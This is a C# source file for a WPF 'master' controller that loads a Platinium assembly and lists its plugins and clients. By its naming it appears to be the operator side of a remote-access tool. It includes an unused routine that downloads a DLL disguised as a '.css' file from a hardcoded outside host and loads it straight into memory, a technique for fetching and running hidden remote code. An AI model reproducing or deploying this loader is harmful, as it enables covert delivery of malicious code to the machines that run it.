﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace PlatiniumMasterWPF
{
    class MasterController
    {
        private static string DLL_URL = "http://repositorio123.esy.es/Platinium.css";
        private byte[] raw_assembly;
        private Assembly assembly;
        private Type type;
        private object instance;
        public MasterController()
        {
            InitializeEnvironment();
            Initialize();
        }
        private void Initialize()
        {
            type = assembly.GetType("Platinium.Entities.PlatiniumMaster");
            instance = Activator.CreateInstance(type);
        }
        private void InitializeEnvironment()
        {
            StaticEnvironmentLoading();
        }
        private void DynamicEnvironmentLoading()
        {
            using (var client = new WebClient())
            {
                raw_assembly = client.DownloadData(DLL_URL);
            }
            assembly = Assembly.Load(raw_assembly);
        }
        private void StaticEnvironmentLoading()
        {
            assembly = Assembly.LoadFrom(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().ToString()), "Platinium.dll"));
        }
        public void GetPlugins()
        {
            MethodInfo methodInfo = type.GetMethod("GetPlugins");
            methodInfo.Invoke(instance, null);
        }
        public void GetClientList()
        {
            MethodInfo methodInfo = type.GetMethod("GetClients");
            methodInfo.Invoke(instance, null);
        }
    }
    class Crypt
    {

    }
}
